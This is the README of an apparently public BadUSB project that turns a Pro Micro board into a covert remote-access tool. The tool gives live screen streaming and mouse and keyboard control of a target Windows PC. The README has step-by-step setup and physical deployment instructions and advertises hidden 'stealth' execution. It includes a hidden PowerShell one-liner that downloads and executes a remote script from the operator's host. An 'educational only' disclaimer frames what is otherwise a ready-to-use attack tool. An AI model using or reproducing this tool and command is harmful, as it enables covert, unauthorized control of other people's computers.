```
██████╗  ██████╗██████╗ ██╗   ██╗
██╔══██╗██╔════╝██╔══██╗╚██╗ ██╔╝
██████╔╝██║     ██████╔╝ ╚████╔╝ 
██╔══██╗██║     ██╔═══╝   ╚██╔╝  
██║  ██║╚██████╗██║        ██║   
╚═╝  ╚═╝ ╚═════╝╚═╝        ╚═╝   
```
**Remote Control Python** - Educational BadUSB Project

[![Python](https://img.shields.io/badge/Python-3.7%2B-blue)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)](https://www.microsoft.com/windows)

> 🎓 **Educational cybersecurity project** demonstrating remote desktop control via BadUSB (Pro Micro).  
> For authorized testing and learning purposes only.

---

## 🚀 Quick Start (3 Steps)

### 1️⃣ Setup Firewall (One Time)
Right-click `1_SETUP_FIREWALL.bat` → **Run as administrator**

### 2️⃣ Start Servers
Double-click `2_START_SERVERS.bat` → GUI opens automatically

### 3️⃣ Deploy
- **Pro Micro**: Upload `ProMicro_Payload.ino` → Plug into target PC
- **Manual**: Run PowerShell command from `TEST_COMMAND.ps1`

---

## ✨ Features

- 🖥️ **Live Screen Streaming** - Real-time desktop capture (30 FPS)
- 🖱️ **Mouse Control** - Full cursor control with click/drag support
- ⌨️ **Keyboard Control** - Type and send keystrokes remotely
- 🎨 **Modern GUI** - Professional control interface with status indicators
- 🦆 **BadUSB Ready** - Pro Micro Arduino payload included
- 🔒 **Stealth Mode** - Hidden execution, no visible windows

---

## 📁 Project Structure

```
├── 1_SETUP_FIREWALL.bat      # Setup firewall (run as admin once)
├── 2_START_SERVERS.bat        # Start all servers (one-click)
├── 3_TEST_PAYLOAD.bat         # Test locally
├── ProMicro_Payload.ino       # Main Arduino BadUSB code
├── ProMicro_Compact.ino       # Faster execution version
├── ProMicro_Stealth.ino       # Advanced stealth version
├── server_professional.py     # Control GUI server
├── client_control.py          # Python client
├── client.ps1                 # PowerShell payload
└── requirements.txt           # Python dependencies
```

---

## 🛠️ Requirements

**Server (Your PC):**
- Python 3.7+
- Packages: `opencv-python`, `numpy`, `pillow`, `pyautogui`

**Client (Target PC):**
- Python 3.7+
- Same packages as server
- Same WiFi network

**Hardware (Optional):**
- Pro Micro (ATmega32U4) - ~$5
- Micro USB cable

**Install dependencies:**
```bash
pip install -r requirements.txt
```

---

## 📖 How It Works

```
┌─────────────────┐         ┌──────────────────┐
│   Pro Micro     │   USB   │   Target PC      │
│   (BadUSB)      ├────────►│   Executes       │
└─────────────────┘         │   PowerShell     │
                            └────────┬─────────┘
                                     │
                            Downloads client.ps1
                                     │
                                     ▼
                            ┌────────────────────┐
                            │  Python Client     │
                            │  Screen Capture    │
                            │  Command Listener  │
                            └─────────┬──────────┘
                                      │
                              Network (Port 5555)
                                      │
                            ┌─────────▼──────────┐
                            │  Your Server       │
                            │  Control GUI       │
                            │  Mouse/Keyboard    │
                            └────────────────────┘
```

---

## 🎮 Pro Micro Setup

### Arduino IDE Configuration
1. Install [Arduino IDE](https://www.arduino.cc/en/software)
2. Add board URL: `https://raw.githubusercontent.com/sparkfun/Arduino_Boards/master/IDE_Board_Manager/package_sparkfun_index.json`
3. Install **SparkFun AVR Boards**
4. Select: **Tools → Board → SparkFun Pro Micro**
5. Select: **Tools → Processor → ATmega32U4 (5V, 16MHz)**

### Upload Code
1. Open `ProMicro_Payload.ino`
2. Update IP address (line 18): `const char* TARGET_IP = "YOUR_IP";`
3. Click **Upload** (→)
4. Done! Pro Micro is now a BadUSB

### Deployment
1. Start servers on your PC (`2_START_SERVERS.bat`)
2. Plug Pro Micro into target PC
3. Wait 3-5 seconds (auto-executes)
4. Remove Pro Micro
5. Connection appears in GUI! 🎉

---

## 🔧 Configuration

### Get Your IP Address
```powershell
ipconfig | Select-String "IPv4"
```

### Update IP in Files
- `ProMicro_Payload.ino` (line 18)
- `client.ps1` (line 27)

### Ports
- **5555** - Control server (screen streaming + commands)
- **8000** - Web server (hosts client.ps1)

---

## 🧪 Testing

### Test Locally
```bash
# Start servers
.\2_START_SERVERS.bat

# In new terminal, run test
.\3_TEST_PAYLOAD.bat

# Check GUI for connection to 127.0.0.1
```

### Manual Test Command
```powershell
powershell -W Hidden -NoP -C "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/client.ps1')"
```

---

## 🐛 Troubleshooting

| Issue | Solution |
|-------|----------|
| **No connection** | Check both devices on same WiFi |
| **Firewall blocked** | Run `1_SETUP_FIREWALL.bat` as admin |
| **Pro Micro not detected** | Install CH340 drivers, press reset twice |
| **Upload failed** | Press reset twice quickly, upload immediately |
| **Python errors** | Install dependencies: `pip install -r requirements.txt` |
| **Web server error** | Port 8000 in use, close other applications |

---

## 📚 Documentation

- **[README_PROMICRO.md](README_PROMICRO.md)** - Complete Pro Micro guide
- **[SETUP.md](SETUP.md)** - Quick setup instructions
- **[TEST_COMMAND.ps1](TEST_COMMAND.ps1)** - Test commands and variations

---

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY**

This project is designed for:
- 📚 Learning cybersecurity concepts
- 🧪 Authorized penetration testing
- 🎓 Security research and education

**DO NOT USE FOR:**
- ❌ Unauthorized access to systems
- ❌ Malicious activities
- ❌ Any illegal purposes

**You are solely responsible for your actions.** Only use this tool on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal under laws such as the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide.

---

## 🤝 Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Submit a pull request

---

## 📄 License

This project is licensed under the MIT License - see [LICENSE](LICENSE) for details.

---

## 🙏 Acknowledgments

- **Hak5** - BadUSB inspiration
- **Arduino Community** - Pro Micro support
- **Python Community** - Excellent libraries

---

## 📊 Stats

- **Cost**: ~$5 (Pro Micro) vs $50+ (Rubber Ducky)
- **Setup Time**: ~5 minutes
- **Execution Time**: 3-5 seconds
- **Detection Rate**: Depends on antivirus (educational tool)

---

<div align="center">

**Made with ❤️ for Cybersecurity Education**

[Report Bug](https://github.com/InoshMatheesha/Screen-Controller/issues) · [Request Feature](https://github.com/InoshMatheesha/Screen-Controller/issues)

</div>
